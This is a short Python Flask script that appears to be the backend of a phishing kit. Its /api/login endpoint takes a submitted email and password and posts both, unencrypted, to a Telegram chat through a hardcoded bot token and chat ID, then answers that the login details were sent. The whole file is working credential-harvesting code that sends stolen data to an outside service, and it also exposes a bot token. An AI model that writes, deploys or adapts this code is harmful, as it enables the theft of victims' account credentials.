from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN = "5428932092:AAHv3X52kjEj-RiL8S-Juy1vZiX_ThL_I4k"
CHAT_ID = "676012585"

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    email = data.get('email')
    password = data.get('password')

    if not email or not password:
        return jsonify({"error": "Missing email or password"}), 400

    message = f"Login Attempt:\nEmail: {email}\nPassword: {password}"
    send_to_telegram(message)

    return jsonify({"message": "Login details sent to Telegram"}), 200

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {'chat_id': CHAT_ID, 'text': message}
    requests.post(url, json=payload)

if __name__ == '__main__':
    app.run(debug=True)
